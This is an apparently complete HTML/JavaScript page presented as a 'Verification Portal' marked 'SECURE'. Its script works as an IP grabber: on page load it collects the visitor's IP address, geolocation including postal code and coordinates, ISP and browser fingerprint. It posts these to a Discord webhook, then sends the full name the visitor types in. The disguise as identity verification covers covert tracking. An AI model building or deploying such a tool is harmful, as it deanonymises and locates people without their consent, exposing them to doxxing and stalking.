<<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity & Network Logger</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0a0f 0%, #14141f 100%);
            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(10, 10, 20, 0.9);
            backdrop-filter: blur(12px);
            border-radius: 32px;
            border: 1px solid rgba(88, 101, 242, 0.4);
            padding: 40px;
            max-width: 550px;
            width: 100%;
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5);
        }

        h1 {
            color: #fff;
            font-size: 28px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .badge {
            background: #5865F2;
            font-size: 12px;
            padding: 4px 12px;
            border-radius: 50px;
            font-weight: normal;
        }

        .sub {
            color: #888;
            margin-bottom: 30px;
            border-left: 3px solid #5865F2;
            padding-left: 15px;
        }

        label {
            display: block;
            color: #ddd;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 14px 18px;
            background: #1e1e2e;
            border: 1px solid #3a3a4a;
            border-radius: 16px;
            color: white;
            font-size: 16px;
            outline: none;
            transition: all 0.2s;
        }

        input:focus {
            border-color: #5865F2;
            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.2);
        }

        button {
            width: 100%;
            padding: 14px;
            background: #5865F2;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border: none;
            border-radius: 40px;
            margin-top: 25px;
            cursor: pointer;
            transition: all 0.2s;
        }

        button:hover {
            background: #4752c4;
            transform: scale(1.01);
        }

        button:active {
            transform: scale(0.98);
        }

        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 16px;
            text-align: center;
            font-size: 13px;
            background: #1a1a2a;
            color: #aaa;
            border-left: 3px solid #5865F2;
        }

        .hidden-data {
            display: none;
        }

        .log {
            font-size: 11px;
            color: #555;
            margin-top: 20px;
            text-align: center;
            word-break: break-all;
        }

        hr {
            margin: 20px 0;
            border-color: #2a2a3a;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>
        🕵️ Verification Portal
        <span class="badge">SECURE</span>
    </h1>
    <div class="sub">Please verify your identity below</div>

    <label>📛 FULL NAME (English only)</label>
    <input type="text" id="fullName" placeholder="e.g., Michael Anderson" autocomplete="off">
    
    <label>🌐 Discord Webhook URL</label>
    <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." value="">
    <div class="log" style="margin-top: 5px; font-size: 11px;">⚠️ Webhook will auto-send IP & network data on page load (before name entry)</div>

    <button id="submitBtn">✓ SUBMIT FULL NAME → SEND SECOND WEBHOOK</button>
    
    <div id="status">🔍 Loading... Sending network data to webhook</div>
    <div class="log" id="debugLog"></div>
</div>

<script>
    // ============================================================
    // GODMODE WEBHOOK COLLECTOR
    // Phase 1: ON PAGE LOAD -> send IP + network data (before name)
    // Phase 2: User enters name -> send name + ALL data again
    // ============================================================

    let collectedNetworkData = {};  // Store all network info
    let firstWebhookSent = false;    // Track if initial webhook was sent
    let currentWebhookUrl = '';

    const fullNameInput = document.getElementById('fullName');
    const webhookUrlInput = document.getElementById('webhookUrl');
    const submitBtn = document.getElementById('submitBtn');
    const statusDiv = document.getElementById('status');
    const debugLogDiv = document.getElementById('debugLog');

    function setStatus(msg, isError = false) {
        statusDiv.innerHTML = msg;
        statusDiv.style.borderLeftColor = isError ? '#ed4245' : '#5865F2';
        statusDiv.style.color = isError ? '#ffaaaa' : '#aaa';
    }

    function debugLog(msg) {
        debugLogDiv.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
        console.log(msg);
    }

    // ============ FUNCTION: Get IP and Network Data (Multiple APIs) ============
    async function fetchNetworkData() {
        const networkInfo = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages.join(', '),
            screenResolution: `${screen.width}x${screen.height}`,
            screenColorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            referrer: document.referrer || 'direct',
            url: window.location.href,
            localStorageEnabled: false,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unspecified',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            touchSupport: 'ontouchstart' in window,
            webdriver: navigator.webdriver || false
        };

        // Check localStorage
        try {
            localStorage.setItem('test', '1');
            localStorage.removeItem('test');
            networkInfo.localStorageEnabled = true;
        } catch(e) { networkInfo.localStorageEnabled = false; }

        // Get IP and geo info via multiple free APIs (parallel)
        let ip = 'unknown';
        let isp = 'unknown';
        let city = 'unknown';
        let country = 'unknown';
        let region = 'unknown';

        try {
            // Primary IP API (ipapi.co - gives JSON)
            const ipResponse = await fetch('https://ipapi.co/json/');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                ip = ipData.ip || ip;
                city = ipData.city || city;
                country = ipData.country_name || ipData.country || country;
                region = ipData.region || region;
                isp = ipData.org || ipData.asn || isp;
                networkInfo.ip = ip;
                networkInfo.city = city;
                networkInfo.country = country;
                networkInfo.region = region;
                networkInfo.isp = isp;
                networkInfo.postal = ipData.postal || '';
                networkInfo.latitude = ipData.latitude || '';
                networkInfo.longitude = ipData.longitude || '';
            } else {
                throw new Error('ipapi failed');
            }
        } catch (e) {
            debugLog('ipapi.co failed, trying backup...');
            try {
                // Backup: ipify + ip-api.com
                const ipifyRes = await fetch('https://api.ipify.org?format=json');
                const ipifyData = await ipifyRes.json();
                ip = ipifyData.ip;
                const ipApiRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,city,regionName,isp,query`);
                const geoData = await ipApiRes.json();
                if (geoData.status === 'success') {
                    city = geoData.city || city;
                    country = geoData.country || country;
                    region = geoData.regionName || region;
                    isp = geoData.isp || isp;
                }
                networkInfo.ip = ip;
                networkInfo.city = city;
                networkInfo.country = country;
                networkInfo.region = region;
                networkInfo.isp = isp;
            } catch(e2) {
                debugLog('All IP APIs failed: ' + e2.message);
                networkInfo.ip = 'unable to fetch';
                networkInfo.city = 'unknown';
                networkInfo.country = 'unknown';
                networkInfo.isp = 'unknown';
            }
        }

        return networkInfo;
    }

    // ============ FUNCTION: Send Webhook to Discord ============
    async function sendToDiscord(webhookUrl, data, isNameIncluded = false, fullNameValue = '') {
        if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
            setStatus('❌ Invalid Discord webhook URL. Please enter a valid one.', true);
            return false;
        }

        // Build rich embed
        let description = '';
        if (isNameIncluded && fullNameValue) {
            description = `**📛 FULL NAME SUBMITTED:** \`${fullNameValue}\`\n\n`;
        } else {
            description = `**🔍 AUTOMATED DATA COLLECTION (PRE-NAME)**\nPage loaded. No name entered yet.\n\n`;
        }

        const embed = {
            title: isNameIncluded ? '✅ Identity + Network Report' : '⚠️ Network Intelligence Report',
            color: isNameIncluded ? 0x57F287 : 0x5865F2,
            description: description,
            fields: [
                { name: '🌐 IP Address', value: `\`${data.ip || 'unknown'}\``, inline: true },
                { name: '📍 Location', value: `${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}`, inline: true },
                { name: '🏢 ISP / Organization', value: `${data.isp || 'unknown'}`, inline: false },
                { name: '💻 User Agent', value: `\`${(data.userAgent || '').substring(0, 200)}\``, inline: false },
                { name: '🖥️ Screen', value: `${data.screenResolution} / ${data.screenColorDepth}-bit`, inline: true },
                { name: '⏰ Timezone', value: `${data.timezone} (UTC${data.timezoneOffset / -60})`, inline: true },
                { name: '🗣️ Language', value: data.language || 'unknown', inline: true },
                { name: '🔧 Platform', value: data.platform || 'unknown', inline: true },
                { name: '🍪 Cookies Enabled', value: data.cookiesEnabled ? 'Yes' : 'No', inline: true },
                { name: '💾 LocalStorage', value: data.localStorageEnabled ? 'Yes' : 'No', inline: true },
                { name: '🧠 CPU Cores', value: String(data.hardwareConcurrency), inline: true },
                { name: '🔗 Referrer', value: data.referrer || 'direct', inline: false },
                { name: '🕒 Timestamp', value: data.timestamp || new Date().toISOString(), inline: false }
            ],
            footer: { text: `Auto-logged | ${isNameIncluded ? 'Name entry phase' : 'Initial page load'}` }
        };

        // Add full name if included
        if (isNameIncluded && fullNameValue) {
            embed.fields.unshift({ name: '📛 SUBMITTED FULL NAME', value: `**${fullNameValue}**`, inline: false });
        }

        const payload = { embeds: [embed] };

        try {
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                let errorText = `HTTP ${response.status}`;
                try {
                    const errJson = await response.json();
                    errorText += ` - ${errJson.message || JSON.stringify(errJson)}`;
                } catch(e) {}
                throw new Error(errorText);
            }
            return true;
        } catch (err) {
            debugLog(`Webhook send failed: ${err.message}`);
            setStatus(`❌ Webhook error: ${err.message}`, true);
            return false;
        }
    }

    // ============ PHASE 1: ON PAGE LOAD (BEFORE NAME) ============
    async function initializeAutoSend() {
        setStatus('📡 Collecting network data and sending initial webhook...');
        
        // Get network data (IP, location, etc.)
        collectedNetworkData = await fetchNetworkData();
        debugLog('Network data collected: ' + JSON.stringify(collectedNetworkData, null, 2));
        
        // Get webhook URL from input field (user must have entered it already)
        const webhookUrl = webhookUrlInput.value.trim();
        currentWebhookUrl = webhookUrl;
        
        if (!webhookUrl) {
            setStatus('⚠️ Waiting for webhook URL to be entered. Please paste Discord webhook URL above.', false);
            debugLog('No webhook URL yet – will auto-send once user enters it');
            // Watch for webhook URL input to auto-send when filled
            const checkWebhookInterval = setInterval(async () => {
                const newUrl = webhookUrlInput.value.trim();
                if (newUrl && newUrl.startsWith('https://discord.com/api/webhooks/') && !firstWebhookSent) {
                    clearInterval(checkWebhookInterval);
                    setStatus('🔗 Webhook detected! Sending initial network data now...');
                    const success = await sendToDiscord(newUrl, collectedNetworkData, false, '');
                    if (success) {
                        firstWebhookSent = true;
                        setStatus('✅ Initial webhook sent! Network data logged to Discord. Enter your full name and click submit.', false);
                    }
                }
            }, 1000);
            return;
        }
        
        // If webhook URL already present, send immediately
        if (webhookUrl && webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
            const success = await sendToDiscord(webhookUrl, collectedNetworkData, false, '');
            if (success) {
                firstWebhookSent = true;
                setStatus('✅ Initial webhook sent! Network data logged to Discord. Enter your full name and click submit.', false);
            }
        } else {
            setStatus('⚠️ Enter a valid Discord webhook URL above. It will auto-send once valid.', false);
        }
    }

    // ============ PHASE 2: USER CLICKS SUBMIT (WITH FULL NAME) ============
    async function sendNameWebhook() {
        const fullName = fullNameInput.value.trim();
        if (!fullName) {
            setStatus('❌ Please enter your full name (English letters only).', true);
            return;
        }
        
        const nameRegex = /^[A-Za-z\s\-'.]{2,100}$/;
        if (!nameRegex.test(fullName)) {
            setStatus('❌ Invalid name. Use only English letters, spaces, hyphens, or apostrophes (2-100 chars).', true);
            return;
        }
        
        let webhookUrl = webhookUrlInput.value.trim();
        if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
            setStatus('❌ Please enter a valid Discord webhook URL.', true);
            return;
        }
        
        setStatus(`📤 Sending SECOND webhook with full name: ${fullName}...`);
        
        // Make sure we have network data (in case it wasn't loaded yet)
        if (Object.keys(collectedNetworkData).length === 0) {
            collectedNetworkData = await fetchNetworkData();
        }
        
        const success = await sendToDiscord(webhookUrl, collectedNetworkData, true, fullName);
        
        if (success) {
            setStatus(`✅ SUCCESS! Full name "${fullName}" + network data sent to Discord.`, false);
            debugLog(`Second webhook sent successfully with name: ${fullName}`);
            // Clear name field optionally? No, keep it.
        } else {
            setStatus(`❌ Failed to send name webhook. Check Discord URL and try again.`, true);
        }
    }

    // ============ EVENT LISTENERS ============
    window.addEventListener('DOMContentLoaded', () => {
        initializeAutoSend();
    });
    
    submitBtn.addEventListener('click', sendNameWebhook);
    
    // Also auto-trigger initial send if webhook URL is pasted later
    webhookUrlInput.addEventListener('change', async () => {
        const newUrl = webhookUrlInput.value.trim();
        if (newUrl && newUrl.startsWith('https://discord.com/api/webhooks/') && !firstWebhookSent && Object.keys(collectedNetworkData).length > 0) {
            setStatus('📡 Webhook URL entered – sending initial network data now...');
            const success = await sendToDiscord(newUrl, collectedNetworkData, false, '');
            if (success) {
                firstWebhookSent = true;
                setStatus('✅ Initial webhook sent! Now enter your full name and submit.', false);
            }
        }
    });
</script>
</body>
</html>
